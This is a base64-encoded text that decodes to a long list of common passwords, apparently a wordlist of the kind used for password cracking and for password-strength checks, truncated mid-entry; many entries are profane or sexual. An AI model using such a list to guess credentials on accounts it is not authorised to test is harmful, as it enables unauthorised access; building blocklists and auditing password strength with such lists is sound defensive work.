dGl0dHMNCmxhYnRlYw0KbGlmZXRpbWUNCmplbm55MQ0KbWFzdGVyYmF0ZQ0KbWF5aGVtDQpyZWRidWxsDQpnb3ZvbHMNCmdyZW1saW4NCjUwNTA1MA0KZ21vbmV5DQpydXBlcnQNCnJvdmVycw0KZGlhbW9uZDENCmxvcmVuem8NCnRyaWRlbnQNCmFibm9ybWFsDQpkYXZpZHNvbg0KZGVza2pldA0KY3VkZGxlcw0KbmljZQ0KYnJpc3RvbA0Ka2FyaW5hDQptaWxhbm8NCnZoNTE1MA0KamFyaGVhZA0KMTk4Mg0KYmlnYmlyZA0KYml6a2l0DQpzaXhlcnMNCnNsaWRlcg0Kc3RhcjY5DQpzdGFyZmlzaA0KcGVuZXRyYXRpb24NCnRvbW15MQ0Kam9objMxNg0KbWVnaGFuDQptaWNoYWVsYQ0KbWFya2V0DQpncmFudA0KY2FsaWd1bGENCmNhcmwNCmZsaWNrcw0KZmlsbXMNCm1hZGRlbg0KcmFpbHJvYWQNCmNvc21vDQpjdGh1bGh1DQpicmFkZm9yZA0KYnIwZDNyDQptaWxpdGFyeQ0KYmVhcmJlYXINCnN3ZWRpc2gNCnNwYXduDQpwYXRyaWNrMQ0KcG9sbHkNCnRoZXNlDQp0b2RkDQpyZWRzDQphbmFyY2h5DQpncm9vdmUNCmZyYW5jbw0KZnVja2hlcg0Kb29vbw0KdHlyb25lDQp2ZWdhcw0KYWlyYnVzDQpjb2JyYTENCmNocmlzdGluZQ0KY2xpcHMNCmRlbGV0ZQ0KZHVzdGVyDQpraXR0eTENCm1vdXNlMQ0KbW9ua2V5cw0KamF6em1hbg0KMTkxOQ0KMjYyNjI2DQpzd2luZ2luZw0Kc3Ryb2tlDQpzdG9ja3MNCnN0aW5nDQpwaXBwZW4NCmxhYnJhZG9yDQpqb3JkYW4xDQpqdXN0ZG9pdA0KbWVhdGJhbGwNCmZlbWFsZXMNCnNhdHVyZGF5DQpwYXJrDQp2ZWN0b3INCmNvb3Rlcg0KZGVmZW5kZXINCmRlc2VydA0KZGVtb24NCm5pa2UNCmJ1YmJhcw0KYm9ua2Vycw0KZW5nbGlzaA0Ka2FodW5hDQp3aWxkbWFuDQo0MTIxDQpzaXJpdXMNCnN0YXRpYw0KcGllcmNpbmcNCnRlcnJvcg0KdGVlbmFnZQ0KbGVlbGVlDQptYXJpc3NhDQptaWNyb3NvZg0KbWVjaGFuaWMNCnJvYm90ZWNoDQpyYXRlZA0KaGFpbGV5DQpjaGFzZXINCnNhbmRlcnMNCnNhbHNlcm8NCm51dHMNCm1hY3Jvc3MNCnF1YW50dW0NCnJhY2hhZWwNCnRzdW5hbWkNCnVuaXZlcnNlDQpkYWRkeTENCmNydWlzZQ0Kbmd1eWVuDQpuZXdwYXNzNg0KbnVkZXMNCmhlbGx5ZWFoDQp2ZXJub24NCjE5NTkNCnphcTEyd3N4DQpzdHJpa2VyDQpzaXh0eQ0Kc3RlZWxlDQpzcGljZQ0Kc3BlY3RydW0NCnNtZWdtYQ0KdGh1bWINCmpqampqampqDQptZWxsb3cNCmFzdHJpZA0KY2FuY3VuDQpjYXJ0b29uDQpzYWJyZXMNCnNhbWlhbQ0KcGFudHMNCm9yYW5nZXMNCm9rbGFob21hDQpsdXN0DQpjb2xlbWFuDQpkZW5hbGkNCm51ZGUNCm5vb2RsZXMNCmJ1enoNCmJyZXN0DQpob290ZXINCm1tbW1tbW1tDQp3YXJ0aG9nDQpibG9vZHkNCmJsdWVibHVlDQp6YXBwYQ0Kd29sdmVyaW5lDQpzbmlmZmluZw0KbGFuY2UNCmplYW4NCmpqampqDQpoYXJwZXINCmNhbGljbw0KZnJlZWUNCnJvdmVyDQpkb29yDQpwb290ZXINCmNsb3NldXANCmJvbnNhaQ0KZXZlbHluDQplbWlseTENCmthdGhyeW4NCmtleXN0b25lDQppaWlpDQoxOTU1DQp5emVybWFuDQp0aGVib3NzDQp0b2xraWVuDQpqaWxsDQptZWdhbWFuDQpyYXN0YQ0KYmJiYmJiYmINCmJlYW4NCmhhbmRzb21lDQpoYWw5MDAwDQpnb29meQ0KZ3JpbmdvDQpnb2Zpc2gNCmdpem1vMQ0Kc2Ftc2FtDQpzY3ViYQ0Kb25seW1lDQp0dHR0dHR0dA0KY29ycmFkbw0KY2xvd24NCmNsYXB0b24NCmRlYm9yYWgNCmJvcmlzDQpidWxscw0Kdml2aWFuDQpqYXloYXdrDQpiZXRoYW55DQp3d3d3DQpzaGFya3kNCnNlZWtlcg0Kc3Nzc3Nzc3MNCnNvbWV0aGluDQpwaWxsb3cNCnRoZXNpbXMNCmxpZ2h0ZXINCmxramhnZg0KbWVsaXNzYTENCm1hcmNpdXMyDQpiYXJyeQ0KZ3VpbmVzcw0KZ3ltbmFzdA0KY2FzZXkxDQpnb2FsaWUNCmdvZHNtYWNrDQpkb3VnDQpsb2xvDQpyYW5nZXJzMQ0KcG9wcHkNCmFiYnkNCmNsZW1zb24NCmNsaXBwZXINCmRlZXpudXRzDQpub2JvZHkNCmhvbGx5MQ0KZWxsaW90DQplZWVlDQpraW5nc3Rvbg0KbWlyaWFtDQpiZWxsZQ0KeW9zZW1pdGUNCnN1Y2tlZA0Kc2V4MTIzDQpzZXh5NjkNCnBpY1wncw0KdG9tbXlib3kNCmxhbW9udA0KbWVhdA0KbWFzdGVyYmF0aW5nDQptYXJpYW5uZQ0KbWFyYw0KZ3JldHpreQ0KaGFwcHlkYXkNCmZyaXNjbw0Kc2NyYXRjaA0Kb3JjaGlkDQpvcmFuZ2UxDQptYW5jaGVzdA0KcXVpbmN5DQp1bmJlbGlldmFibGUNCmFiZXJkZWVuDQpkYXdzb24NCm5hdGhhbGllDQpuZTE0NjkNCmJveGluZw0KaGlsbA0Ka29ybg0KaW50ZXJjb3Vyc2UNCjE2MTYxNg0KMTk4NQ0KemlnZ3kNCnN1cGVyc3RhDQpzdG9uZXkNCnNlbmlvcg0KYW1hdHVyZQ0KYmFyYmVyDQpiYWJ5Ym95DQpiY2ZpZWxkcw0KZ29saWF0aA0KaGFjaw0KaGFyZHJvY2sNCmNoaWxkcmVuDQpmcm9kbw0Kc2NvdXQNCnNjcmFwcHkNCnJvc2llDQpxYXpxYXoNCnRyYWNrZXINCmFjdGl2ZQ0KY3JhdmluZw0KY29tbWFuZG8NCmNvaGliYQ0KZGVlcA0KY3ljbG9uZQ0KZGFuYQ0KYnViYmE2OQ0Ka2F0aWUxDQptcGVncw0KdnNlZ2RhDQpqYWRlDQppcmlzaDENCmJldHRlcg0Kc2V4eTENCnNpbmNsYWlyDQpzbWVsbHkNCnNxdWVydGluZw0KbGlvbnMNCmpva2Vycw0KamVhbmV0dGUNCmp1bGlhDQpqb2pvam8NCm1lYXRoZWFkDQphc2hsZXkxDQpncm91Y2hvDQpjaGVldGFoDQpjaGFtcA0KZmlyZWZveA0KZ2FuZGFsZjENCnBhY2tlcg0KbWFnbm9saWENCmxvdmU2OQ0KdHlsZXIxDQp0eXBob29uDQp0dW5kcmENCmJvYmJ5MQ0Ka2Vud29ydGgNCnZpbGxhZ2UNCnZvbGxleQ0KYmV0aA0Kd29sZjM1OQ0KMDQyMA0KMDAwMDA3DQpzd2ltbWVyDQpza3lkaXZlDQpzbW9rZXMNCnBhdHR5DQpwZXVnZW90DQpwb21wZXkNCmxlZ29sYXMNCmtyaXN0eQ0KcmVkaG90DQpyb2RtYW4NCnJlZGFsZXJ0DQpoYXZpbmcNCmdyYXBlcw0KNHJ1bm5lcg0KY2FycmVyYQ0KZmxvcHB5DQpkb2xsYXJzDQpvdTgxMjINCnF1YXR0cm8NCmFkYW1zDQpjbG91ZDkNCmRhdmlkcw0Kbm9mZWFyDQpidXN0eQ0KaG9tZW1hZGUNCm1tbW1tDQp3aGlzcGVyDQp2ZXJtb250DQp3ZWJtYXN0ZQ0Kd2l2ZXMNCmluc2VydGlvbg0KamF5amF5DQpwaGlsaXBzDQpwaG9uZQ0KdG9waGVyDQp0b25ndWUNCnRlbXB0cmVzcw0KbWlkZ2V0DQpyaXBrZW4NCmhhdmVmdW4NCmdyZXRjaGVuDQpjYW5vbg0KY2VsZWJyaXR5DQpmaXZlDQpnZXR0aW5nDQpnaGV0dG8NCmRpcmVjdA0Kb3R0bw0KcmFnbmFyb2sNCnRyaW5pZGFkDQp1c25hdnkNCmNvbm92ZXINCmNydWlzZXINCmRhbHNoZQ0Kbmljb2xlMQ0KYnV6emFyZA0KaG90dGVzdA0Ka2luZ2Zpc2gNCm1pc2ZpdA0KbW9vcmUNCm1pbGZuZXcNCndhcmxvcmQNCndhc3N1cA0KYmlnc2V4eQ0KYmxhY2toYXcNCnppcHB5DQpzaGVhcmVyDQp0aWdodHMNCnRodXJzZGF5DQprdW5nZnUNCmxhYmlhDQpqb3VybmV5DQptZWF0bG9hZg0KbWFybGVuZQ0KcmlkZXINCmFyZWE1MQ0KYmF0bWFuMQ0KYmFuYW5hcw0KNjM2MzYzDQpjYW5jZWwNCmdnZ2dnDQpwYXJhZG94DQptYWNrDQpseW5uDQpxdWVlbnMNCmFkdWx0cw0KYWlraWRvDQpjaWdhcnMNCm5vdmENCmhvb3NpZXINCmVleW9yZQ0KbW9vc2UxDQp3YXJleg0KaW50ZXJhY2lhbA0Kc3RyZWFtaW5nDQozMTMxMzENCnBlcnRpbmFudA0KcG9vbDYxMjMNCm1heWRheQ0Kcml2ZXJzDQpyZXZlbmdlDQphbmltYXRlZA0KYmFua2VyDQpiYWRkZXN0DQpnb3Jkb24yNA0KY2NjY2MNCmZvcnR1bmUNCmZhbnRhc2llcw0KdG91Y2hpbmcNCmFpc2FuDQpkZWFkbWFuDQpob21lcGFnZQ0KZWphY3VsYXRpb24NCndob2NhcmVzDQppc2Nvb2wNCmphbWVzYm9uDQoxOTU2DQoxcHVzc3kNCndvbWFtDQpzd2VkZW4NCnNraWRvbw0Kc3BvY2sNCnNzc3NzDQpwZXRyYQ0KcGVwcGVyMQ0KcGluaGVhZA0KbWljcm9uDQphbGxzb3ANCmFtc3RlcmRhDQphcm15DQphc2lkZQ0KZ3VubmFyDQo2NjY5OTkNCmNoaXANCmZvb3QNCmZvd2xlcg0KZmVicnVhcnkNCmZhY2UNCmZsZXRjaA0KZ2VvcmdlMQ0Kc2FwcGVyDQpzY2llbmNlDQpzYXNoYTENCmx1Y2t5ZG9nDQpsb3ZlcjENCm1hZ2ljaw0KcG9wb3BvDQpwdWJsaWMNCnVsdGltYQ0KZGVyZWsNCmN5cHJlc3MNCmJvb2tlcg0KYnVzaW5lc3NiYWJlDQpicmFuZG9uMQ0KZWR3YXJkcw0KZXhwZXJpZW5jZQ0KdnVsdmENCnZ2dnYNCmphYnJvbmkNCmJpZ2JlYXINCnl1bW15DQowMTAyMDMNCnNlYXJheQ0Kc2VjcmV0MQ0Kc2hvd2luZw0Kc2luYmFkDQpzZXh4eHgNCnNvbGVpbA0Kc29mdHdhcmUNCnBpY2NvbG8NCnRoaXJ0ZWVuDQpsZW9wYXJkDQpsZWdhY3kNCmplbnNlbg0KanVzdGluZQ0KbWVtb3JleA0KbWFyaXNhDQptYXRoZXcNCnJlZHdpbmcNCnJhc3B1dGluDQoxMzQ2NzkNCmFuZmllbGQNCmdyZWVuYmF5DQpnb3JlDQpjYXRjYXQNCmZlYXRoZXINCnNjYW5uZXINCnBhNTV3b3JkDQpjb250b3J0aW9uaXN0DQpkYW56aWcNCmRhaXN5MQ0KaG9yZXMNCmVyaWsNCmV4b2R1cw0KdmlubmllDQppaWlpaWkNCnplcm8NCjEwMDENCnN1YndheQ0KdGFuaw0Kc2Vjb25kDQpzbmFwcGxlDQpzbmVha2Vycw0Kc29ueWZ1Y2sNCnBpY2tzDQpwb29kbGUNCnRlc3QxMjM0DQp0aGVpcg0KbGxsbA0KanVuZWJ1Zw0KanVuZQ0KbWFya2VyDQptZWxsb24NCnJvbmFsZG8NCnJvYWRraWxsDQphbWFuZGExDQphc2RmamtsDQpiZWFjaGVzDQpncmVlbmUNCmdyZWF0MQ0KY2hlZXJsZWFlcnMNCmZvcmNlDQpkb2l0bm93DQpvenp5DQptYWRlbGluZQ0KcmFkaW8NCnR5c29uDQpjaHJpc3RpYW4NCmRhcGhuZQ0KYm94c3Rlcg0KYnJpZ2h0b24NCmhvdXNld2lmZXMNCmVtbWFudWVsDQplbWVyc29uDQpra2trDQptbmJ2Y3gNCm1vb2Nvdw0KdmlkZXMNCndhZ25lcg0KamFuZXQNCjE3MTcNCmJpZ21vbmV5DQpibG9uZHMNCjEwMDANCnN0b3J5cw0Kc3RlcmVvDQo0NTQ1DQo0MjAyNDcNCnNlZHVjdGl2ZQ0Kc2V4eWdpcmwNCmxlc2JlYW4NCmxpdmUNCmp1c3RpbjENCjEyNDU3OA0KYW5pbWFscw0KYmFsYW5jZQ0KaGFuc2VuDQpjYWJiYWdlDQpjYW5hZGlhbg0KZ2FuZ2JhbmdlZA0KZG9kZ2UxDQpkaW1hcw0KbG9yaQ0KbG91ZA0KbWFsYWthDQpwdXNzDQpwcm9iZXMNCmFkcmlhbmENCmNvb2xtYW4NCmNyYXdmb3JkDQpkYW50ZQ0KbmFja2VkDQpob3RwdXNzeQ0KZXJvdGljYQ0Ka29vbA0KbWlycm9yDQp3ZWFyaW5nDQppbXBsYW50cw0KaW50cnVkZXINCmJpZ2Fzcw0KemVuaXRoDQp3b29ob28NCndvbWFucw0KdGFueWENCnRhbmdvDQpzdGFjeQ0KcGlzY2VzDQpsYWd1bmENCmtyeXN0YWwNCm1heGVsbA0KYW5keW9kMjINCmJhcmNlbG9uDQpjaGFpbnNhdw0KY2hpY2tlbnMNCmZsYXNoMQ0KZG93bnRvd24NCm9yZ2FzbXMNCm1hZ2ljbWFuDQpwcm9maXQNCnB1c3l5DQpwb3RoZWFkDQpjb2NvbnV0DQpjaHVja2llDQpjb250YWN0DQpjbGV2ZWxhbg0KZGVzaWduZXINCmJ1aWxkZXINCmJ1ZHdlaXNlDQpob3RzaG90DQpob3Jpem9uDQpob2xlDQpleHBlcmllbmNlZA0KbW9uZGVvDQp3aWZlcw0KMTk2Mg0Kc3RyYW5nZQ0Kc3R1bXB5DQpzbWl0aHMNCnNwYXJrcw0Kc2xhY2tlcg0KcGlwZXINCnBpdGNoZXJzDQpwYXNzd29yZHMNCmxhcHRvcA0KamVyZW1pYWgNCmFsbG1pbmUNCmFsbGlhbmNlDQpiYmJiYmJiDQphc3Njb2NrDQpoYWxmbGlmZQ0KZ3JhbmRtYQ0KaGF5bGV5DQo4ODg4OA0KY2VjaWxpYQ0KY2hhY2hhDQpzYXJhdG9nYQ0Kc2FuZHkxDQpzYW50b3MNCmRvb2dpZQ0KbnVtYmVyDQpwb3NpdGl2ZQ0KcXdlcnQ0MA0KdHJhbnNleHVhbA0KY3Jvdw0KY2xvc2UtdXANCmRhcnJlbGwNCmJvbml0YQ0KaWI2dWI5DQp2b2x2bw0KamFjb2IxDQppaWlpaQ0KYmVhc3RpZQ0Kc3VubnlkYXkNCnN0b25lZA0Kc29uaWNzDQpzdGFyZmlyZQ0Kc25hcG9uDQpwaWN0dWVycw0KcGVwZQ0KdGVzdGluZzENCnRpYmVyaXVzDQpsaXNhbGlzYQ0KbGVzYmFpbg0KbGl0bGUNCnJldGFyZA0KcmlwcGxlDQphdXN0aW4xDQpiYWRnaXJsDQpnb2xmZ29sZg0KZmxvdW5kZXINCmdhcmFnZQ0Kcm95YWxzDQpkcmFnb29uDQpkaWNraWUNCnBhc3N3b3INCm9jZWFuDQptYWplc3RpYw0KcG9wcG9wDQp0cmFpbGVycw0KZGFtbWl0DQpub2tpYQ0KYm9ib2JvDQpicjU0OQ0KZW1taXR0DQprbm9jaw0KbWluaW1lDQptaWtlbWlrZQ0Kd2hpdGVzb3gNCjE5NTQNCjMyMzINCjM1MzUzNQ0Kc2VhbXVzDQpzb2xvDQpzcGFya2xlDQpzbHV0dGV5DQpwaWN0ZXJlDQp0aXR0ZW4NCmxiYWNrDQoxMDI0DQphbmdlbGluYQ0KZ29vZGx1Y2sNCmNoYXJsdG9uDQpmaW5nZXJpZw0KZ2FsbGFyaWVzDQpnb2F0DQpydWJ5DQpwYXNzbWUNCm9hc2lzDQpsb2NrZXJyb29tDQpsb2dhbjENCnJhaW5tYW4NCnR3aW5zDQp0cmVhc3VyZQ0KYWJzb2x1dGVseQ0KY2x1Yg0KY3VzdG9tDQpjeWNsb3BzDQpuaXBwZXINCmJ1Y2tldA0KaG9tZXBhZ2UtDQpoaGhoaA0KbW9tc3Vjaw0KaW5kYWluDQoyMzQ1DQpiZWVyYmVlcg0KYmltbWVyDQpzdXNhbm5lDQpzdHVubmVyDQpzdGV2ZW5zDQo0NTY0NTYNCnNoZWxsDQpzaGViYQ0KdG9vdHNpZQ0KdGlueQ0KdGVzdGVyZXINCnJlZWZlcg0KcmVhbGx5DQoxMDEyDQpoYXJjb3JlDQpnb2xsdW0NCjU0NTQ1NA0KY2hpY28NCmNhdmVtYW4NCmNhcm9sZQ0KZm9yZGYxNTANCmZpc2hlcw0KZ2F5bWVuDQpzYWxlZW4NCmRvb2Rvbw0KcGE1NXcwcmQNCmxvb25leQ0KcHJlc3RvDQpxcXFxcQ0KY2lnYXINCmJvZ2V5DQpicmV3ZXINCmhlbGxvbw0KZHV0Y2gNCmthbWlrYXplDQptb250ZQ0Kd2Fzc2VyDQp2aWV0bmFtDQp2aXNhDQpqYXBhbmVlcw0KMDEyMw0Kc3dvcmRzDQpzbGFwcGVyDQpwZWFjaA0KanVtcA0KbWFydmVsDQptYXN0ZXJiYWl0aW5nDQptYXJjaA0KcmVkd29vZA0Kcm9sbGluZw0KMTAwNQ0KYW1ldHVlcg0KY2hpa3MNCmNhdGh5DQpjYWxsYXdheQ0KZnVjaW5nDQpzYWRpZTENCnBhbmFzb25pDQptYW1hcw0KcmFjZQ0KcmFtYm8NCnVua25vd24NCmFic29sdXQNCmRlYWNvbg0KZGFsbGFzMQ0KaG91c2V3aWZlDQprcmlzdGkNCmtleXdlc3QNCmtpcnN0ZW4NCmtpcHBlcg0KbW9ybmluZw0Kd2luZ3MNCmlkaW90DQoxODQzNjU3Mg0KMTUxNQ0KYmVhdGluZw0KenhjenhjDQpzdWxsaXZhbg0KMzAzMDMwDQpzaGFtYW4NCnNwYXJyb3cNCnRlcnJhcGluDQpqZWZmZXJ5DQptYXN0dXJiYXRpb24NCm1pY2sNCnJlZGZpc2gNCjE0OTINCmFuZ3VzDQpiYXJyZXR0DQpnb2lyaXNoDQpoYXJkY29jaw0KZmVsaWNpYQ0KZm9yZnVuDQpnYWxhcnkNCmZyZWVwb3JuDQpkdWNoZXNzDQpvbGl2aWVyDQpsb3R1cw0KcG9ybm9ncmFwaGljDQpyYW1zZXMNCnB1cmR1ZQ0KdHJhdmVsZXINCmNyYXZlDQpicmFuZG8NCmVudGVyMQ0Ka2lsbG1lDQptb25leW1hbg0Kd2VsZGVyDQp3aW5kc29yDQp3aWZleQ0KaW5kb24NCnl5eXl5DQpzdHJldGNoDQp0YXlsb3IxDQo0NDE3DQpzaG9wcGluZw0KcGljaGVyDQpwaWNrdXANCnRodW1ibmlscw0Kam9obmJveQ0KamV0cw0KamVzcw0KbWF1cmVlbg0KYW5uZQ0KYW1ldGV1cg0KYW1hdGV1cnMNCmFwb2xsbzEzDQpoYW1ib25lDQpnb2xkd2luZw0KNTA1MA0KY2hhcmxleQ0Kc2FsbHkxDQpkb2dob3VzZQ0KcGFkcmVzDQpwb3VuZGluZw0KcXVlc3QNCnRydWVsb3ZlDQp1bmRlcmRvZw0KdHJhZGVyDQpjcmFjaw0KY2xpbWJlcg0KYm9saXRhcw0KYnJhdm8NCmhvaG9obw0KbW9kZWwNCml0YWxpYW4NCmJlYW5pZQ0KYmVyZXR0YQ0Kd3Jlc3RsaW4NCnN0cm9rZXINCnRhYml0aGENCnNoZXJ3b29kDQpzZXh5bWFuDQpqZXdlbHMNCmpvaGFubmVzDQptZXRzDQptYXJjb3MNCnJoaW5vDQpiZHNtDQpiYWxsb29ucw0KZ29vZG1hbg0KZ3JpbHMNCmhhcHB5MTIzDQpmbGFtaW5nbw0KZ2FtZXMNCnJvdXRlNjYNCmRldm8NCmRpbm8NCm91dGthc3QNCnBhaW50YmFsDQptYWdwaWUNCmxsbGxsbGxsDQp0d2lsaWdodA0KY3JpdHRlcg0KY2hyaXN0aWUNCmN1cGNha2UNCm5pY2tlbA0KYnVsbHNleWUNCmtyaXN0YQ0Ka25pY2tlcmxlc3MNCm1pbWkNCm11cmRlcg0KdmlkZW9lcw0KYmlubGFkZW4NCnhlcnhlcw0Kc2xpbQ0Kc2xpbmt5DQpwaW5reQ0KcGV0ZXJzb24NCnRoYW5hdG9zDQptZWlzdGVyDQptZW5hY2UNCnJpcGxleQ0KcmV0aXJlZA0KYWxiYXRyb3MNCmJhbGxvb24NCmJhbmsNCmdvdGVuDQo1NTUxMjEyDQpnZXRzZG93bg0KZG9udXRzDQpkaXZvcmNlDQpud280bGlmZQ0KbG9yZA0KbG9zdA0KdW5kZXJ3ZWFyDQp0dHR0DQpjb21ldA0KZGVlcg0KZGFtbml0DQpkZGRkZGRkZA0KZGVlem51dHoNCm5hc3R5MQ0Kbm9ub25vDQpuaW5hDQplbnRlcnByaXNlDQplZWVlZQ0KbWlzZml0OTkNCm1pbGttYW4NCnZ2dnZ2dg0KaXNhYWMNCjE4MTgNCmJsdWVib3kNCmJlYW5zDQpiaWdidXR0DQp3eWF0dA0KdGVjaA0Kc29sdXRpb24NCnBvZXRyeQ0KdG9vbG1hbg0KbGF1cmVsDQpqdWdnYWxvDQpqZXRza2kNCm1lcmVkaXRoDQpiYXJlZm9vdA0KNTBzcGFua3MNCmdvYmVhcnMNCnNjYW5kaW5hdmlhbg0Kb3JpZ2luYWwNCnRydW1hbg0KY3ViYmllcw0Kbml0cmFtDQpicmlhbmENCmVib255DQpraW5ncw0Kd2FybmVyDQpiaWxibw0KeXVteXVtDQp6enp6enp6DQpzdHlsdXMNCjMyMTY1NA0Kc2hhbm5vbjENCnNlcnZlcg0Kc2VjdXJlDQpzaWxseQ0Kc3F1YXNoDQpzdGFybWFuDQpzdGVlbGVyDQpzdGFwbGVzDQpwaHJhc2VzDQp0ZWNobmlxdWVzDQpsYXNlcg0KMTM1NzkwDQphbGxhbg0KYmFya2VyDQphdGhlbnMNCmNicjYwMA0KY2hlbWljYWwNCmZlc3Rlcg0KZ2FuZ3N0YQ0KZnVja3UyDQpmcmVlemUNCmdhbWUNCnNhbHZhZG9yDQpkcm9vcHkNCm9iamVjdHMNCnBhc3N3ZA0KbGxsbGwNCmxvYWRlZA0KbG91aXMNCm1hbmNoZXN0ZXINCmxvc2Vycw0KdmVkZGVyDQpjbGl0DQpjaHVua3kNCmRhcmttYW4NCmRhbWFnZQ0KYnVja3Nob3QNCmJ1ZGRhaA0KYm9vYmVkDQpoZW50aQ0KaGlsbGFyeQ0Kd2ViYmVyDQp3aW50ZXIxDQppbmdyaWQNCmJpZ21pa2UNCmJldGENCnppZGFuZQ0KdGFsb24NCnNsYXZlMQ0KcGlzc29mZg0KcGVyc29uDQp0aGVncmVhdA0KbGl2aW5nDQpsZXh1cw0KbWF0YWRvcg0KcmVhZGVycw0KcmlsZXkNCnJvYmVydGENCmFybWFuaQ0KYXNobGVlDQpnb2xkc3Rhcg0KNTY1Ng0KY2FyZHMNCmZtYWxlDQpmZXJyaXMNCmZ1a2luZw0KZ2FzdG9uDQpmdWNrdQ0KZ2dnZ2dnZw0Kc2F1cm9uDQpkaWdnbGVyDQpwYWNlcnMNCmxvb3Nlcg0KcG91bmRlZA0KcHJlbWllcg0KcHVsbGVkDQp0b3duDQp0cmlzaGENCnRyaWFuZ2xlDQpjb3JuZWxsDQpjb2xsaW4NCmNvc21pYw0KZGVlcGVyDQpkZXBlY2hlDQpub3J3YXkNCmJyaWdodA0KaGVsbWV0DQprcmlzdGluZQ0Ka2VuZGFsbA0KbXVzdGFyZA0KbWlzdHkxDQp3YXRjaA0KamFnZ2VyDQpiZXJ0aWUNCmJlcmdlcg0Kd29yZA0KM3g3cHhyDQpzaWx2ZXIxDQpzbW9raW5nDQpzbm93Ym9hcg0Kc29ubnkNCnBhdWxhDQpwZW5ldHJhdGluZw0KcGhvdG9lcw0KbGVzYmVucw0KbGFtYmVydA0KbGluZHJvcw0KbGlsbGlhbg0Kcm9hZGtpbmcNCnJvY2tmb3JkDQoxMzU3DQoxNDMxNDMNCmFzYXNhcw0KZ29vZGJveQ0KODk4OTg5DQpjaGljYWdvMQ0KY2FyZA0KZmVycmFyaTENCmdhbGVyaWVzDQpnb2RmYXRoZQ0KZ2F3a2VyDQpnYXJnb3lsZQ0KZ2FuZ3N0ZXINCnJ1YmJsZQ0KcnJycg0Kb25ldGltZQ0KcHVzc3ltYW4NCnBvb3Bwb29wDQp0cmFwcGVyDQp0d2VudHkNCmFicmFoYW0NCmNpbmRlcg0KY29tcGFueQ0KbmV3Y2FzdGwNCmJvcmljdWENCmJ1bm55MQ0KYm94ZXINCmhvdHJlZA0KaG9ja2V5MQ0KaG9vcGVyDQplZHdhcmQxDQpldmFuDQprcmlzDQptaXNlcnkNCm1vc2Nvdw0KbWlsaw0KbW9ydGdhZ2UNCmJpZ3RpdA0Kc2hvdw0Kc25vb3Bkb2cNCnRocmVlDQpsaW9uZWwNCmxlYW5uZQ0Kam9zaHVhMQ0KanVseQ0KMTIzMA0KYXNzaG9sZXMNCmNlZHJpYw0KZmFsbGVuDQpmYXJsZXkNCmdlbmUNCmZyaXNreQ0Kc2FuaXR5DQpzY3JpcHQNCmRpdmluZQ0KZGhhcm1hDQpsdWNreTEzDQpwcm9wZXJ0eQ0KdHJpY2lhDQpha2lyYQ0KZGVzaXJlZQ0KYnJvYWR3YXkNCmJ1dHRlcmZseQ0KaHVudA0KaG90Ym94DQpob290aWUNCmhlYXQNCmhvd2R5DQplYXJ0aGxpbmsNCmthcm1hDQpraXRlYm95DQptb3RsZXkNCndlc3R3b29kDQoxOTg4DQpiZXJ0DQpibGFja2Jpcg0KYmlnZ2xlcw0Kd3JlbmNoDQp3b3JraW5nDQp3cmVzdGxlDQpzbGlwcGVyeQ0KcGhlb25peA0KcGVubnkxDQpwaWFub21hbg0KdG9tb3Jyb3cNCnRoZWR1ZGUNCmplbm4NCmpvbmpvbg0Kam9uZXMxDQptYXR0aWUNCm1lbW9yeQ0KbWljaGVhbA0Kcm9hZHJ1bm4NCmFycm93DQphdHRpdHVkZQ0KYXp6ZXINCnNlYWhhd2tzDQpkaWVoYXJkDQpkb3Rjb20NCmxvbGENCnR1bmFmaXNoDQpjaGl2YXMNCmNpbm5hbW9uDQpjbG91ZHMNCmRlbHV4ZQ0Kbm9ydGhlcm4NCm51Y2xlYXINCm5vcnRoDQpib29tDQpib29iaWUNCmh1cmxleQ0Ka3Jpc2huYQ0KbW9tb21vDQptb2RsZXMNCnZvbHVtZQ0KMjMyMzIzMjMNCmJsdWVkb2cNCnd3d3d3d3cNCnplcm9jb29sDQp5b3VzdWNrDQpwbHV0bw0KbGltZXdpcmUNCmxpbmsNCmpvdW5nDQptYXJjaWENCmF3bnljZQ0KZ29uYXZ5DQpoYWhhDQpmaWxtcytwaWMrZ2FsZXJpZXMNCmZhYmlhbg0KZnJhbmNvaXMNCmdpcnNsDQpmdWNrdGhpcw0KZ2lyZnJpZW5kDQpydWZ1cw0KZHJpdmUNCnVuY2VuY29yZWQNCmExMjM0NTYNCmFpcnBvcnQNCmNsYXkNCmNocmlzYmxuDQpjb21iYXQNCmN5Z251cw0KY3Vwb2kNCm5ldmVyDQpuZXRzY2FwZQ0KYnJldHQNCmhoaGhoaGhoDQplYWdsZXMxDQplbGl0ZQ0Ka25vY2tlcnMNCmtlbmRyYQ0KbW9tbXkNCjE5NTgNCnRhem1hbmlhDQpzaG9udWYNCnBpYW5vDQpwaGFybWFjeQ0KdGhlZG9nDQpsaXBzDQpqaWxsaWFuDQpqZW5raW5zDQptaWR3YXkNCmFyc2VuYWwxDQphbmFjb25kYQ0KYXVzdHJhbGkNCmdyb21pdA0KZ290b2hlbGwNCjc4Nzg3OA0KNjY2NjYNCmNhcm1leDINCmNhbWJlcg0KZ2F0b3IxDQpnaW5nZXIxDQpmdXp6eQ0Kc2VhZG9vDQpkb3JpYW4NCmxvdmVzZXgNCnJhbmNpZA0KdXV1dXV1DQo5MTE5MTENCm5hdHVyZQ0KYnVsbGRvZzENCmhlbGVuDQpoZWFsdGgNCmhlYXRlcg0KaGlnZ2lucw0Ka2lyaw0KbW9uYWxpc2ENCm1tbW1tbW0NCndoaXRlb3V0DQp2aXJ0dWFsDQp2ZW50dXJhDQpqYW1pZTENCmphcGFuZXMNCmphbWVzMDA3DQoyNzI3DQoyNDY5DQpibGFtDQpiaXRjaGFzcw0KYmVsaWV2ZQ0KemVwaHlyDQpzdGlmZnkNCnN3ZWV0MQ0Kc2lsZW50DQpzb3V0aHBhcg0Kc3BlY3RyZQ0KdGlnZ2VyMQ0KdGVra2VuDQpsZW5ueQ0KbGFrb3RhDQpsaW9ua2luZw0Kampqampqag0KbWVkaWNhbA0KbWVnYXRyb24NCjEzNjkNCmhhd2FpaWFuDQpneW1uYXN0aWMNCmdvbGZlcjENCmd1bm5lcnMNCjc3NzkzMTENCjUxNTE1MQ0KZmFtb3VzDQpnbGFzcw0Kc2NyZWVuDQpydWR5DQpyb3lhbA0Kc2FuZnJhbg0KZHJha2UNCm9wdGltdXMNCnBhbnRoZXIxDQpsb3ZlMQ0KbWFpbA0KbWFnZ2llMQ0KcHVkZGluZw0KdmVuaWNlDQphYXJvbjENCmRlbHBoaQ0KbmljZWFzcw0KYm91bmNlDQpidXN0ZWQNCmhvdXNlMQ0Ka2lsbGVyMQ0KbWlyY